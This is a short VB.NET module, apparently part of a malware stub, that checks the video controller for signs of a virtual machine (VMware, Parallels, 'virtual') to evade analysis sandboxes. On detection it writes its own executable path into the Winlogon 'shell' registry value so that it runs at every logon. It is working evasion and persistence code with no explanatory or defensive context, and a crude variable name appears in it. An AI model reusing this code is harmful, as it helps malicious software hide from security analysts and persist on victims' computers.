Imports System.Management
Imports System.Security.Principal
Imports Microsoft.Win32

Module AntiEverything
    Public AntisDetected As Boolean = False
    Public Function IsAdmin() As Boolean
        Try
            Dim id As WindowsIdentity = WindowsIdentity.GetCurrent()

            Dim p As WindowsPrincipal = New WindowsPrincipal(id)

            Return p.IsInRole(WindowsBuiltInRole.Administrator)

        Catch
            Return False
        End Try

    End Function
    Public Sub RunAntis()
        On Error Resume Next

        If Not IO.File.Exists(IO.Path.GetTempPath & "microsoft.ini") Then
            AntiVM()
        End If

    End Sub

    Public Function AntiVM() As String
        Try
            Dim searcher As New ManagementObjectSearcher("root\CIMV2", "SELECT * FROM Win32_VideoController")
            Dim str As String = String.Empty
            Dim obj2 As ManagementObject
            For Each obj2 In searcher.Get
                str = Convert.ToString(obj2.Item("Description"))
                Dim Search As String = StrConv(str, VbStrConv.Lowercase)
                If Search.Contains("virtual") Then AntisFound()
                If Search.Contains("vmware") Then AntisFound()
                If Search.Contains("parallels") Then AntisFound()
                If Search.Contains("vm additions") Then AntisFound()
            Next
        Catch : End Try
    End Function

    Public Sub AntisFound()
        On Error Resume Next
        WhatToRun = ""
        Dim Fuckyou As RegistryKey
        Fuckyou = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", True)
        Fuckyou.SetValue("shell", "explorer.exe," & """" & Application.ExecutablePath & """")
        Fuckyou.Close()
    End Sub
End Module
